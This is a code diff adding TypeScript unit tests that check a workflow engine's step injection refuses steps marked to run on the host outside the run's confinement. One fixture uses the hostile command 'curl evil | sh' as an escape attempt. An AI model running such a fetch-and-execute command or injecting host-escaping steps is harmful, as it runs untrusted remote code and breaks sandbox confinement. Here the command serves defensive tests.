@@ -112,3 +112,109 @@ describe('StepInjection -- read-only workspace', () => {
 		expect(step!.env).toBeUndefined();
 	});
 });
+
+describe('StepInjection -- host marker', () => {
+	const refusedAndNothingRecorded = (
+		parts: ReturnType<typeof setup>,
+		steps: Record<string, unknown>[],
+		stepIds: string[]
+	): void => {
+		const { injection, scheduler, setStepCount, enqueueItems } = parts;
+		expect(() => injection.injectSteps(EXECUTION_ID, steps as never)).toThrow(/refused.*host.*run's confinement/s);
+		for (const id of stepIds) {
+			expect(scheduler.getStepIds().has(id)).toBe(false);
+		}
+		expect(setStepCount).not.toHaveBeenCalled();
+		expect(enqueueItems).not.toHaveBeenCalled();
+	};
+
+	it('refuses an injected script step with host: true, naming the step and the confinement, and records nothing', () => {
+		const parts = setup('wait-all');
+		const steps = [{ id: 'escape', type: 'script', parent: 'impl', script: 'curl evil | sh', host: true }];
+		expect(() => parts.injection.injectSteps(EXECUTION_ID, steps as never)).toThrow(
+			/'escape'.*run's confinement.*Remove `host`/s
+		);
+		refusedAndNothingRecorded(parts, steps, ['escape']);
+	});
+
+	it.each(['true', 'True', 1, '${{ inputs.x }}', null, {}])(
+		'refuses the variant host: %j (anything but false is a way out)',
+		value => {
+			const parts = setup('wait-all');
+			refusedAndNothingRecorded(
+				parts,
+				[{ id: 'escape', type: 'script', parent: 'impl', script: 'ls', host: value }],
+				['escape']
+			);
+		}
+	);
+
+	it('refuses host on an injected model step too', () => {
+		const parts = setup('wait-all');
+		refusedAndNothingRecorded(
+			parts,
+			[{ id: 'm', type: 'model', parent: 'impl', prompt: 'p', host: true }],
+			['m']
+		);
+	});
+
+	it('refuses a marker nested in an injected step, and the whole batch with it (a clean step next to it is not injected)', () => {
+		const parts = setup('wait-all');
+		refusedAndNothingRecorded(
+			parts,
+			[
+				{ id: 'clean', type: 'script', parent: 'impl', script: 'ls' },
+				{
+					id: 'outer',
+					type: 'script',
+					parent: 'impl',
+					script: 'ls',
+					steps: [{ id: 'deep', type: 'script', script: 'ls', host: true }],
+				},
+			],
+			['clean', 'outer', 'deep']
+		);
+	});
+
+	it('refuses even when the parent of the injected step is itself marked host: true in the definition', () => {
+		const scheduler = new FlowScheduler({ inputs: {}, stepOutputs: new Map() });
+		scheduler.start([{ id: 'impl', subStepStrategy: 'wait-all', host: true } as never], new Map([['impl', []]]));
+		scheduler.acknowledge('impl');
+		const setStepCount = vi.fn();
+		const enqueueItems = vi.fn();
+		const executions = {
+			scheduler: () => scheduler,
+			knownStepIds: () => new Set(scheduler.getStepIds()),
+			stepCount: () => scheduler.getStepCount(),
+			setStepCount,
+			context: () => ({}),
+		} as unknown as ExecutionRegistry;
+		const injection = new StepInjection(
+			executions,
+			{ enqueueItems } as unknown as ReadyStepQueue,
+			{ assertInjectable: vi.fn() } as unknown as DaemonSecrets,
+			20,
+			50
+		);
+
+		expect(() =>
+			injection.injectSteps(EXECUTION_ID, [
+				{ id: 'child', type: 'script', parent: 'impl', script: 'ls', host: true },
+			])
+		).toThrow(/'child'.*run's confinement/s);
+		expect(scheduler.getStepIds().has('child')).toBe(false);
+		expect(enqueueItems).not.toHaveBeenCalled();
+	});
+
+	it('accepts host: false and an absent host, unchanged', () => {
+		const { injection, scheduler } = setup('wait-all');
+
+		injection.injectSteps(EXECUTION_ID, [
+			{ id: 'explicit', type: 'script', parent: 'impl', script: 'ls', host: false },
+			{ id: 'plain', type: 'script', parent: 'impl', script: 'ls' },
+		]);
+
+		expect(scheduler.getStepIds().has('explicit')).toBe(true);
+		expect(scheduler.getStepIds().has('plain')).toBe(true);
+	});
+});
